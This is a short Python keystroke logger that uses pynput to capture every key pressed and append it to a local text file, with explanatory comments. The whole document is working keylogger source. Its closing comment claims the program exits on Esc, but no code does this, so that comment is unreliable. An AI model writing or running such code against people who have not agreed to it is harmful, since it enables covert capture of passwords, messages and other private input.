import pynput

# Path to the file where the keys will be saved
file_path = "pressed_keys.txt"

# Function called on each key press event
def on_press(key):
    try:
        # Open the file in append mode to add new keys at the end
        with open(file_path, "a") as file:
            # Convert the pressed key to a string and write it to the file
            file.write(str(key) + "\n")
    except Exception as e:
        print("An error occurred while saving the key:", str(e))

# Create an instance of the keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

# Start listening to the keyboard in a separate thread
keyboard_listener.start()

# Wait for pressing the 'Esc' key to exit the program
keyboard_listener.join()
